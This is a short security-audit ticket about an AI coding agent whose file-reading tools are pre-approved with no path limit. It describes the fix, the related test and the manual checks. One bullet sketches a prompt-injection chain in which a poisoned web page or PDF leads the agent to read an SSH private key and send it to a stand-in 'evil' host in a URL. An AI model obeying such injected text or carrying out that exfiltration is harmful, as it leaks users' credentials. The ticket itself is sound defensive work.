# Task 1: Agent can read any file on the computer

Priority: **Must fix** (security). Source: repo audit, 2026-10-17.

## Now

1. Developer: remove `Read`, `Grep`, `Glob` from `allowedTools` in `server/src/agent/claude-agent.ts:48`. About 10 minutes.
2. Developer: run the manual check below. About 5 minutes.

## Short

- `Read`, `Grep`, `Glob` are pre-approved with no path rule, so they work outside the tree folder.
- `WebFetch` and `save_attachment` with a `url` can send data out.
- A poisoned web page or uploaded PDF (prompt injection) can chain both: read `~/.ssh/id_rsa`, then fetch `https://evil/?d=<contents>`.
- Fix is one line plus one test update.

## Where

- `server/src/agent/claude-agent.ts:14` (`ALLOWED_TOOLS`)
- `server/src/agent/claude-agent.ts:48-49` (`tools`, `allowedTools`)
- `server/test/agent.test.ts:213` (expects the current list)

## Fix

Keep the three tools in `tools`, drop them from `allowedTools`. Reads inside `cwd` stay allowed by default; `permissionMode: 'dontAsk'` then refuses reads outside it. Keep `WebSearch`, `WebFetch` and the attachment tool in `allowedTools`.

## Done when

- `pnpm --filter @otago/server ask <tree> "Read /etc/hosts and quote it"` gets a refusal or a permission error.
- The same command asking about a file in `sources/` still works.
- `server/test/agent.test.ts` passes with the updated list.

## Open risk

The fix relies on how the Agent SDK permission engine treats `dontAsk`. The manual check above is the proof; do not skip it.

## Next

Open `server/src/agent/claude-agent.ts` at line 48.
